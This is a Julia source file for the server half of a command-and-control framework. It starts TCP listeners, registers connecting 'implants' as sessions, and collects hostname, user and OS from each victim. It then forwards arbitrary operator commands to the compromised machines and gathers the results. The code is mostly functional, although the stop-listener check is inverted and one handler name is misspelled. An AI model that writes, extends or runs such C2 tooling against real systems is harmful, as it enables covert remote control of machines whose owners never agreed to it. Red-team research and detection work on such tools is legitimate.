using UUIDs
using Sockets


Base.@kwdef struct Session 
    id::AbstractString = string(uuid4())
    commands::Channel = Channel{String}(32)
    results::Channel = Channel{Tuple{String, String}}(32)
end

Base.@kwdef mutable struct C2
    listeners::Dict{AbstractString, Task} = Dict()
    sessions::Dict{AbstractString, Session} = Dict()
end


function sendCommand(conn, cmd::String)
    @debug " 📥 sending '$cmd'"
    write(conn, "$cmd\n")
    response = readline(conn)
    @debug "Got '$response'"
    return response
end

function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
    session = Session()
    c2.sessions[session.id] = session
    println("New implant connected $(session.id)")

    hostname = sendCommand(conn, "hostname")
    user = sendCommand(conn, "whoami")
    os = inferOS(sendCommand(conn, "uname"))

    println(" .... session started")
    publish!(bus, SessionStarted(id=session.id, listenerId=listenerId, hostname=hostname, user=user, os=os))
    println(" .... post publish\n\n")
    # active lifetime of the implant
    while true
        @warn "Waiting for commands on implant $(session.id)"
        cmd = take!(session.commands)
        println(" >>>> 🫡 Command: $cmd")
        res = sendCommand(conn, cmd)
        println("result of command '$cmd': $res")
        put!(session.results, (cmd, res))
    end

    # cleanup after the session ended
    println("done with implant $session.id")
    publish!(bus, SessionEnded(session.id))
end

function inferOS(os::String) :: AbstractString
    os = lowercase(os)
    if contains(os, "darwin")
        return "macOS"
    elseif contains(os, "linux")
        return "Linux"
    elseif contains(os, "win")
        return "Windows"
    end
    return "Unknown"
end


function startListener(ev::StartListener, bus:: MessageBus, c2::C2)
    listenerId = string(uuid4())
    @info "Start C2 listener ($listenerId) on port $(ev.port)"

    # HTTP.serve!(handleNewImplant, "0.0.0.0",ev.port; async=true)
    listenerTask = errormonitor(@async begin
        server = Sockets.listen(ev.port)
        while true # TODO maybe create Event to stop  here and return the event as result event from this fn, so the event can be set somewhere else
            sock = Sockets.accept(server)
            errormonitor(@async handleNewImplant(sock, bus, listenerId, c2))
        end
        @warn "Listener stopped"
    end)

    c2.listeners[listenerId] = listenerTask
    return ListenerReady(listenerId, ev.port, listenerTask)
end

function onStopListener(ev::StopListener, channel:: Channel, c2::C2)
    listener = get(c2.listeners, ev.listenerId, nothing)
    if isnothing(listener)
        # TODO stop listener
        close(listener)
        return ListenerStopped(ev.listenerId)
    end
    @error "Could not find listener with id $(ev.listenerId) to stop"
    # return ListenerStopped(ev.listenerId)
end



function onSessionEnded(ev::SessionEnded, c2::C2)
    delete!(c2.sessions, ev.sessionId)
end


function executeActionOnTarget(ev::ExecuteActionOnTarget, bus:: MessageBus, c2::C2)
    session = get(c2.sessions, ev.target, nothing)
    if isnothing(session)
        @error "Could not find target with id $(ev.target)"
        return
    end
    println("sending action via channel")
    put!(session.commands, ev.action)
    result = take!(session.results)
    println("Action result: $result")
end



function startC2(bus:: MessageBus)
    # start out with one listener out of the box

    c2 = C2()
    ev = startListener(StartListener(), bus, c2)
    publish!(bus, ev)

    register!(bus, StartListener, (ev) -> startListener(ev, bus, c2))
    register!(bus, StopListener, (ev) -> onStoptListener(ev, bus, c2))
    register!(bus, ExecuteActionOnTarget, (ev) -> executeActionOnTarget(ev, bus, c2))

    register!(bus, SessionEnded, (ev) -> onSessionEnded(ev, c2))
end 